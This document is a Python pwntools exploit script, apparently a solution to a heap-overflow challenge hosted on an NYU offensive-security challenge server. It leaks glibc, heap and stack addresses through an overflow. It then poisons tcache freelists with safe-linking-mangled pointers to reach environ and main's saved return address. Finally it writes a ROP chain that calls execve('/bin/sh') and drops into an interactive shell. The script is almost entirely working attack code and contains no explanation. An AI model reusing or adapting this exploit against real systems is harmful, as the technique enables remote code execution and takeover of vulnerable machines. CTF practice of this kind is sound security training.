from pwn import *
import time 

def add(size):
  recieved = p.recvuntil(b">").decode('utf-8')
  p.send(b"1" + b"\n")
  recieved = p.recvuntil(b"Size:\n").decode('utf-8')
  p.send(size.encode() + b"\n")
  
def edit(num, size, payload):
  recieved = p.recvuntil(b">").decode('utf-8')
  p.send(b"3" + b"\n")
  recieved = p.recvuntil(b"edit?\n>").decode('utf-8')
  p.send(num.encode() + b"\n")
  recieved = p.recvuntil(b"Size:\n").decode('utf-8')
  p.send(size.encode() + b"\n")
  recieved = p.recvuntil(b"Content:\n").decode('utf-8')
  p.send(payload + b"\n")

def delete(num):
  recieved = p.recvuntil(b">").decode('utf-8')
  p.send(b"2" + b"\n")
  recieved = p.recvuntil(b"delete?\n>").decode('utf-8')
  p.send(num.encode() + b"\n")
  
def read(num):
  recieved = p.recvuntil(b">").decode('utf-8')
  p.send(b"4" + b"\n")
  recieved = p.recvuntil(b"read?\n>").decode('utf-8')
  p.send(num.encode() + b"\n")
  

local = False

context.arch = "amd64"
context.os = "linux"
context.bits = 64
context.log_level="DEBUG"
context.terminal = ["tmux", "splitw", "-h", "-f"]

if local:
    p = gdb.debug("./overflow", '''
                              set follow-fork-mode child
                              break main
                              continue
                              ''')
else:
    p=remote("offsec-chalbroker.osiris.cyber.nyu.edu", 12348)

e = ELF("./libc.so.6")
r = ROP("./libc.so.6")

add("1033")
edit("0", "1035", b"A"*1033)

add("1050")
edit("1", "1052", b"B"*1050)

add("32")
edit("2", "34", b"C"*32)

add("32")
edit("3", "34", b"D"*32)

add("32")
edit("4", "34", b"E"*32)

add("32")
edit("5", "34", b"F"*32)

add("32")
edit("6", "34", b"G"*32)

add("32")
edit("7", "34", b"H"*32)

add("32")
edit("8", "34", b"I"*32)

add("32")
edit("9", "34", b"J"*32)

add("32")
edit("10", "34", b"K"*32)


delete("1")
delete("3")
delete("5")

edit("0", "1072", b"")

read("0")

recieved = p.recvline()
recieved = p.recvline()
recieved = p.recvline()
recieved = p.recvline()
leaked = recieved[-44:-36]
leaked_addr = ""
for byte in leaked:
  leaked_addr = format(byte, '02x') + leaked_addr
leaked_addr = "0x" + leaked_addr
print(leaked_addr)
decimal_leaked_addr = int(leaked_addr, 16)
print(hex(decimal_leaked_addr))

glibc_base = decimal_leaked_addr - 2206944
print("GLIBC BASE: " + str(hex(glibc_base)))



edit("2", "71", b"")
read("2")

recieved = p.recvline()
recieved = p.recvline()
recieved = p.recvline()
recieved = p.recvline()
heap_leaked = recieved[-59:-51]
heap_leaked_addr = ""
for byte in heap_leaked:
  heap_leaked_addr = format(byte, '02x') + heap_leaked_addr
heap_leaked_addr = "0x" + heap_leaked_addr
print(heap_leaked_addr)
heap_front = int(heap_leaked_addr, 16) << 12
print(hex(heap_front))

environ_addr = glibc_base + e.symbols["environ"]
print("environ addr: " + str(hex(environ_addr)))

target_chunk = heap_front+0xb80
payload = b"E"*32 + (0xa).to_bytes(8, "little") + (0x31).to_bytes(8, "little") + ((target_chunk >> 12) ^ environ_addr).to_bytes(8, "little")
edit("4", "58", payload)

add("32")
add("32")
read("3")

recieved = p.recvline()
recieved = p.recvline()
print(recieved)
stack_leaked = recieved[:9]
recieved = p.recvline()
recieved = p.recvline()
stack_leaked_addr = ""
for byte in stack_leaked:
  stack_leaked_addr = format(byte, '02x') + stack_leaked_addr
stack_leaked_addr = "0x" + stack_leaked_addr
print(stack_leaked_addr)
stack = int(stack_leaked_addr, 16)

main_pushed_rip = stack - 0x128
print(hex(main_pushed_rip))

delete("7")
delete("9")

target_chunk = heap_front+0xc40
payload = b"I"*32 + (0xa).to_bytes(8, "little") + (0x31).to_bytes(8, "little") + ((target_chunk >> 12) ^ main_pushed_rip).to_bytes(8, "little")
edit("8", "58", payload)

payload = [
    (0x1).to_bytes(8, "little"),
    (glibc_base + r.rdi.address).to_bytes(8, "little"),
    (glibc_base + next(e.search(b'/bin/sh'))).to_bytes(8, "little"),
    (glibc_base + r.rax.address).to_bytes(8, "little"),
    (59).to_bytes(8, "little"),
    (glibc_base + r.rsi.address).to_bytes(8, "little"),
    (0).to_bytes(8, "little"),
    (glibc_base + r.syscall.address).to_bytes(8, "little")
]

add("32")
add("32")
edit("7", "80", b"".join(payload))

recieved = p.recvuntil(b">").decode('utf-8')
p.send(b"5" + b"\n")

p.interactive()
